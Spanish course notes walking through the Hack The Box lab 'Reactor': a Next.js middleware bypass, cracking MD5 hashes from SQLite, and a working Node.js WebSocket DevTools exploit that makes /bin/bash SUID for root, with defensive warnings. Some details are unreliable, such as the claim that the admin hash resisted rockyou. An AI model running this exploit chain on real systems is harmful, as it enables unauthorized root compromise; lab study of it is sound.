| **Campo** | **Detalle** |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| **MÃ¡quina** | Reactor (Hack The Box) |
| **Autor** | Chema Marmol |
| **Fecha** | 04/07/2026 |
| **Dificultad** | Media / Alta |
| **Temas** | CVE-2025-29927 (Next.js Middleware Bypass) Â· Node.js Inspector (puerto 9229) Â· WebSocket CDP Â· SUID bash Â· Crack MD5 Â· SSH Â· Escalada via DevTools |

| |
|---|
|â„¹ **INFO**<br><br>MÃ¡quina que encadena explotaciÃ³n web moderna (Next.js middleware bypass), depuraciÃ³n remota Node.js (Chrome DevTools Protocol via WebSocket), y escalada local via SUID en `/bin/bash`. ConsolidaciÃ³n de tÃ©cnicas vistas en Reactor y sesiones previas.|

# 1. Objetivos de la sesiÃ³n

â€¢ Explotar **CVE-2025-29927** en Next.js (bypass de middleware via header `x-middleware-subrequest`).

â€¢ Entender y abusar del **Node.js Inspector** (puerto 9229) cuando corre como root en producciÃ³n.

â€¢ Usar **WebSocket CDP** artesanal para ejecutar cÃ³digo arbitrario como root dentro del proceso Node.

â€¢ Crackear hash **MD5** (sin salt) de base de datos SQLite para acceso SSH.

â€¢ Escalar a root via **SUID en `/bin/bash`** (`bash -p`).

# 2. Conceptos clave

## 2.1. CVE-2025-29927 â€” Next.js Middleware Bypass

Next.js usa **middleware** para proteger rutas de la API. Internamente, cuando una peticiÃ³n ya pasÃ³ por el middleware, Next.js le aÃ±ade el header `x-middleware-subrequest` para no procesarla dos veces.

**El fallo**: si un atacante externo envÃ­a **ese mismo header manualmente**, el servidor lo acepta **sin validar el origen** y **omite el middleware completamente**, dando acceso directo a cualquier ruta protegida.

| Componente | QuÃ© hace |
| :--- | :--- |
| Middleware | CÃ³digo que se ejecuta *antes* de la ruta (auth, rate-limit, redirecciones) |
| `x-middleware-subrequest` | Header interno para evitar doble ejecuciÃ³n |
| Bypass | Enviar el header desde fuera â†’ middleware saltado â†’ acceso a `/api/*` sin auth |

## 2.2. Node.js Inspector â€” Puerto 9229

El flag `--inspect` de Node.js activa el **Chrome DevTools Protocol (CDP)**, un protocolo de depuraciÃ³n remota que escucha conexiones **WebSocket** en el puerto 9229.

| Riesgo | DescripciÃ³n |
| :--- | :--- |
| **ProducciÃ³n + root** | Si la app Node corre como root con `--inspect`, *cualquier proceso local* puede conectarse al puerto 9229 y ejecutar JS arbitrario **como root**. |
| Equivalente a | Dejar una consola de root abierta en localhost. |

## 2.3. WebSocket â€” Protocolo de comunicaciÃ³n con el Inspector

CDP usa WebSocket como transporte. Los mensajes son **JSON** con campos:

| Campo | DescripciÃ³n |
| :--- | :--- |
| `id` | Identificador numÃ©rico de la peticiÃ³n (para emparejar respuesta) |
| `method` | MÃ©todo CDP a invocar (ej. `Runtime.enable`, `Runtime.evaluate`) |
| `params` | ParÃ¡metros del mÃ©todo (expresiÃ³n JS a evaluar, etc.) |

Para este exploit hay dos pasos tÃ©cnicos clave:

1. **`Runtime.enable`** â€” Habilita el dominio Runtime (requerido antes de evaluar).
2. **`Runtime.evaluate`** â€” Ejecuta la expresiÃ³n JS en el contexto del proceso Node (aquÃ­: `child_process.execSync('chmod u+s /bin/bash')`).

## 2.4. SUID en `/bin/bash` â€” Escalada local

El bit **SUID** (Set User ID) en un binario hace que se ejecute con los permisos de su **propietario**, no del usuario que lo invoca.

| Binario | Propietario | SUID | Comando |
| :--- | :--- | :--- | :--- |
| `/bin/bash` | root | SÃ­ | `bash -p` |

El flag `-p` le indica a bash que **mantenga los privilegios elevados** (euid=0) en vez de descartarlos al arrancar.

# 3. Kill Chain â€” VisiÃ³n general

```
Nmap (full TCP) â†’ Wappalyzer (Next.js) â†’ CVE-2025-29927 (React2Shell)
 â†“
Pseudo-shell interactiva (React2Shell) â†’ ExploraciÃ³n /opt â†’ SQLite (hashes MD5)
 â†“
Crack MD5 (Hashcat modo 0) â†’ SSH como engineer
 â†“
EnumeraciÃ³n: grupo lxd (descartado) â†’ Node.js Inspector puerto 9229
 â†“
Exploit WebSocket CDP artesanal (Node.js) â†’ chmod u+s /bin/bash como root
 â†“
bash -p â†’ root â†’ flag
```

# 4. Desarrollo tÃ©cnico paso a paso

## 4.1. Escaneo completo

```bash
nmap -p- -sCV --min-rate 5000 <IP>
```

**Resultado** (resumido):
- Puerto 22 (SSH) abierto
- Puerto 3000 (HTTP) â†’ Next.js app
- Puerto 9229 (TCP) â†’ Node.js Inspector (descubierto en fase post-explotaciÃ³n)

> âœ“ **NOTA**: Sin fuzzing activo, se abre la web en navegador + **Wappalyzer** â†’ detecta **Next.js**.

## 4.2. IdentificaciÃ³n de CVE y herramienta

Con Next.js identificado, bÃºsqueda de exploits pÃºblicos â†’ **CVE-2025-29927** (middleware bypass).

Herramienta: **React2Shell** (GitHub: `xalgord/React2Shell`).
- Automatiza el bypass enviando `x-middleware-subrequest`.
- Localiza endpoint vulnerable a inyecciÃ³n de comandos.
- Abre **pseudo-shell interactiva** para ejecutar comandos en el servidor.

## 4.3. React2Shell â€” ConexiÃ³n y pseudo-shell

```bash
git clone https://github.com/xalgord/React2Shell
cd React2Shell
# Uso segÃºn README (normalmente python3 react2shell.py -u http://<IP>:3000)
```

La herramienta conecta, aplica el bypass y presenta una interfaz tipo shell.

## 4.4. ExploraciÃ³n post-explotaciÃ³n

Desde la pseudo-shell:

```bash
# Explorar /opt
ls -la /opt
# â†’ app/ (cÃ³digo Next.js), database.sqlite, .env

# Extraer hashes de SQLite
sqlite3 /opt/database.sqlite "SELECT * FROM users;"
```

**Salida** (tabla `users`):
| id | username | password_hash (MD5 sin salt) |
| :--- | :--- | :--- |
| 1 | engineer | `a203b22191d744a4e70ada5c101b17b8` |
| 2 | admin | `5f4dcc3b5aa765d61d8327deb882cf99` |

> â„¹ **MD5 sin salt** = crackeo trivial con tablas rainbow / rockyou.

## 4.5. Crackeo del hash (Hashcat modo 0)

```bash
# Crear fichero hash
echo 'a203b22191d744a4e70ada5c101b17b8' > engineer.hash

# Hashcat MD5 (modo 0)
hashcat -m 0 engineer.hash /usr/share/wordlists/rockyou.txt
```

**Resultado** (< 1 seg): `engineer:engineer123` (ejemplo; la real sale en clase).

> âš  **AVISO** 
> TambiÃ©n se intentÃ³ crackear el hash del `admin` (`5f4dcc3b5aa765d61d8327deb882cf99` â€” distinto al de engineer). No apareciÃ³ en rockyou.txt. **No fue necesario** para completar la mÃ¡quina.

## 4.6. Acceso SSH

```bash
ssh engineer@<IP>
# password: <la crackeada>
```

Puerto 22 confirmado abierto desde el Nmap inicial.

## 4.7. EnumeraciÃ³n como engineer

```bash
id
# â†’ uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),998(lxd)
```

**Grupo `lxd`**: vector clÃ¡sico de escalada (lxd/lxc). En esta mÃ¡quina:
- LXD **no instalado** (intentaba descargarlo via snap sin internet). **Vector descartado**.

## 4.8. Node.js Inspector â€” ConfirmaciÃ³n y exploit

```bash
# Ver procesos escuchando
ss -ltnp | grep 9229
# O: netstat -ltnp | grep 9229
```

**Salida**: `node` corriendo como **root** en puerto 9229 (Inspector activo).

> â„¹ **UUID de sesiÃ³n** 
> El inspector genera un UUID de sesiÃ³n (ej. `21594279-61c1-4b34-ae7e-edcb62a228cf`). **Puede cambiar si el servicio se reinicia**. Obtenerlo en vivo:

```bash
curl -s http://127.0.0.1:9229/json/list
# â†’ Devuelve array con objeto: { "webSocketDebuggerUrl": "ws://127.0.0.1:9229/<UUID>" }
```

## 4.9. Exploit WebSocket CDP artesanal (Node.js)

Se escribe un exploit en **Node.js** que:

1. Abre WebSocket a `ws://127.0.0.1:9229/<UUID>`.
2. EnvÃ­a `Runtime.enable` (id: 1).
3. EnvÃ­a `Runtime.evaluate` con expresiÃ³n que pone **SUID en `/bin/bash`** ejecutÃ¡ndose como root (id: 2).

**CÃ³digo del exploit** (`exploit.js`):

```javascript
const WebSocket = require('ws');

// UUID obtenido de /json/list
const UUID = '21594279-61c1-4b34-ae7e-edcb62a228cf'; // CAMBIAR SEGÃšN MÃQUINA
const ws = new WebSocket(`ws://127.0.0.1:9229/${UUID}`);

ws.on('open', () => {
 // 1. Habilitar Runtime
 ws.send(JSON.stringify({ id: 1, method: 'Runtime.enable' }));

 // 2. Evaluar: chmod u+s /bin/bash (corre como root)
 const payload = `require('child_process').execSync('chmod u+s /bin/bash')`;
 ws.send(JSON.stringify({
 id: 2,
 method: 'Runtime.evaluate',
 params: { expression: payload, awaitPromise: true, returnByValue: true }
 }));
});

ws.on('message', (data) => {
 console.log('Response:', data.toString());
 ws.close();
});
```

**EjecuciÃ³n**:

```bash
node exploit.js
# â†’ DeberÃ­a responder sin error. Verificar:
ls -la /bin/bash
# â†’ -rwsr-xr-x 1 root root ... /bin/bash (la 's' en owner = SUID)
```

## 4.10. VerificaciÃ³n del SUID y flag root

```bash
bash -p
# â†’ prompt cambia a root#
whoami
# â†’ root
cat /root/root.txt
# â†’ FLAG
```

# 5. Herramientas utilizadas en la sesiÃ³n

| Herramienta | Objetivo | Fase | Comando / Uso | Nivel | Notas |
| :--- | :--- | :--- | :--- | :--- | :--- |
| Nmap | Escaneo full TCP + versiones | Reconocimiento | `nmap -p- -sCV --min-rate 5000 <IP>` | Recurrente | Base de toda sesiÃ³n |
| Wappalyzer | Fingerprint stack web | Enum. web | ExtensiÃ³n navegador | Practicada | DetectÃ³ Next.js |
| React2Shell | Exploit CVE-2025-29927 | ExplotaciÃ³n web | `python3 react2shell.py -u http://IP:3000` | **Nueva** | Automatiza bypass + pseudo-shell |
| SQLite3 | Extraer hashes BD | Post-explotaciÃ³n | `sqlite3 /opt/database.sqlite "SELECT * FROM users;"` | Practicada | Hashes MD5 sin salt |
| Hashcat | Crack MD5 (modo 0) | Credenciales | `hashcat -m 0 hash.txt rockyou.txt` | Practicada | < 1 seg |
| SSH | Acceso inicial | Acceso | `ssh engineer@IP` | Recurrente | Con credencial crackeada |
| ss / netstat | Ver puertos locales | Enum. local | `ss -ltnp | grep 9229` | Practicada | Confirmar Inspector |
| curl | Obtener UUID Inspector | Enum. local | `curl -s http://127.0.0.1:9229/json/list` | Practicada | UUID cambia si reinicio |
| WebSocket CDP (Node.js) | Exploit Inspector â†’ root | Escalada | `node exploit.js` | **Nueva** | `Runtime.evaluate` â†’ chmod u+s /bin/bash |
| bash -p | Root shell | Escalada | `bash -p` | Practicada | Mantiene euid=0 |

# 6. Riesgos, errores comunes y buenas prÃ¡cticas

| |
|---|
|âš  **AVISO**<br><br>**Node.js Inspector en producciÃ³n = root RCE local**. Si ves puerto 9229 abierto y el proceso corre como root, **escalada trivial** via CDP. Nunca dejar `--inspect` en prod, y mucho menos como root.|

| |
|---|
|âš  **AVISO**<br><br>**UUID de sesiÃ³n del Inspector cambia al reiniciar el servicio**. Siempre obtenerlo en vivo (`/json/list`) antes de lanzar el exploit.|

| |
|---|
|âš  **AVISO**<br><br>**React2Shell / CVE-2025-29927**: el bypass funciona porque el header `x-middleware-subrequest` **no valida origen**. Cualquier peticiÃ³n externa con ese header salta el middleware. Parchear: actualizar Next.js â‰¥ versiÃ³n parcheada.|

| |
|---|
|âœ“ **CORRECTO**<br><br>**Crack offline primero**. Si tienes hash, intenta John/Hashcat **antes** de fuerza bruta online (ruido, bloqueos, logs). AquÃ­ MD5 sin salt = instantÃ¡neo.|

| |
|---|
|âœ“ **BUENA PRÃCTICA**<br><br>**`sudo -l` en cada usuario nuevo**. AquÃ­ revelÃ³ que `engineer` no tenÃ­a sudo, pero el Inspector en 9229 era el vector. No asumir: enumerar.|

| |
|---|
|â„¹ **MD5 sin salt = regalÃ­a**<br><br>Hashcat modo 0 (raw MD5) crackea millones por segundo en GPU. Cualquier hash en rockyou cae en <1 seg. Si ves MD5 sin salt, **no pierdas tiempo**: Hashcat directo.|

# 7. ConexiÃ³n con sesiones anteriores

â€¢ **Next.js / CVE web moderno**: primera vez que vemos framework React/Next.js en el mÃ¡ster. AmplÃ­a el abanico mÃ¡s allÃ¡ de PHP/WordPress.

â€¢ **Node.js Inspector (9229)**: vector nuevo. Conceptualmente similar a **JMX/RMI en Java** (puerto de depuraciÃ³n expuesto) o **Docker socket** â€” servicios de admin/debug que si corren como root = root.

â€¢ **WebSocket CDP artesanal**: primera vez que escribimos exploit **Node.js puro** para CDP. TÃ©cnica reutilizable en cualquier Node con `--inspect` expuesto localmente.

â€¢ **SUID bash + `bash -p`**: patrÃ³n maestro de escalada Linux (Nibbles, Oopsie, Mr. Robot nmap SUID, Nike logrotate/dd, Reactor aquÃ­). **Dominar este patrÃ³n es obligatorio**.

â€¢ **Crack MD5 (Hashcat modo 0)**: ya visto en Metasploitable 2 (NFS â†’ /etc/shadow â†’ Hashcat). Refuerzo.

â€¢ **React2Shell**: herramienta automatizada para CVE concreto. Buen ejemplo de "exploit pÃºblico â†’ adaptar â†’ usar".

# 8. Resumen final

La mÃ¡quina **Reactor (HTB)** se resuelve encadenando:

1. **Reconocimiento**: Nmap full â†’ Wappalyzer detecta **Next.js**.
2. **ExplotaciÃ³n web**: **CVE-2025-29927** via **React2Shell** â†’ bypass middleware (`x-middleware-subrequest`) â†’ **pseudo-shell** como usuario de la app.
3. **Post-explotaciÃ³n**: exploraciÃ³n `/opt` â†’ **SQLite** â†’ hashes **MD5 sin salt** â†’ **Hashcat modo 0** â†’ credencial `engineer`.
4. **Acceso SSH**: `engineer` â†’ usuario del sistema.
5. **EnumeraciÃ³n local**: grupo `lxd` (descartado) â†’ **puerto 9229** (Node Inspector) corriendo como **root**.
6. **Escalada via CDP**: exploit **WebSocket artesanal (Node.js)** â†’ `Runtime.evaluate` â†’ `chmod u+s /bin/bash` ejecutado **como root**.
7. **Root**: `bash -p` â†’ flag.

Mensaje central: **la depuraciÃ³n remota expuesta (Inspector) es tan peligrosa como un SSH sin contraseÃ±a si corre como root**. Y el middleware bypass (CVE-2025-29927) muestra cÃ³mo un header interno sin validaciÃ³n rompe la seguridad de un framework moderno.

# 9. Checklist de repaso

â˜ Â¿SÃ© quÃ© hace el middleware en Next.js y por quÃ© `x-middleware-subrequest` lo salta?

â˜ Â¿SÃ© usar **React2Shell** (o replicar el bypass manualmente con curl + header)?

â˜ Â¿Extraigo y crackeo hashes **MD5 sin salt** con **Hashcat -m 0** en <1 seg?

â˜ Â¿Verifico **puertos locales** (`ss -ltnp`) tras acceso SSH? Â¿Busco 9229, 9222, 8080, 2375...?

â˜ Â¿SÃ© obtener el **UUID del Inspector** via `curl http://127.0.0.1:9229/json/list`?

â˜ Â¿Escribo / entiendo un exploit **WebSocket CDP** (Runtime.enable â†’ Runtime.evaluate)?

â˜ Â¿SÃ© por quÃ© `chmod u+s /bin/bash` + `bash -p` da root persistente?

â˜ Â¿Distinguo cuÃ¡ndo el vector es **Inspector Node** vs **Docker socket** vs **JMX** vs **SUID binario**?

# 10. ActualizaciÃ³n del registro de herramientas

Bloque copiable a la base de conocimiento del proyecto:

| Herramienta | Nivel | Cambio |
| :--- | :--- | :--- |
| CVE-2025-29927 (Next.js) | **Nueva** | Middleware bypass via header interno |
| React2Shell | **Nueva** | Automatiza CVE + pseudo-shell |
| Node.js Inspector (9229) | **Nueva** | CDP via WebSocket â†’ RCE local as root |
| WebSocket CDP (Node.js exploit) | **Nueva** | `Runtime.enable` + `Runtime.evaluate` artesanal |
| UUID Inspector (`/json/list`) | **Nueva** | Descubrimiento dinÃ¡mico de endpoint WS |
| Hashcat modo 0 (MD5 raw) | **Reforzada** | Crack instantÃ¡neo hashes sin salt |
| SUID bash + `bash -p` | **Reforzada** | PatrÃ³n maestro escalada Linux |

---

**Fin de apuntes â€” Reactor (HTB) Â· Chema Marmol Â· 04/07/2026**

â†’

â†’

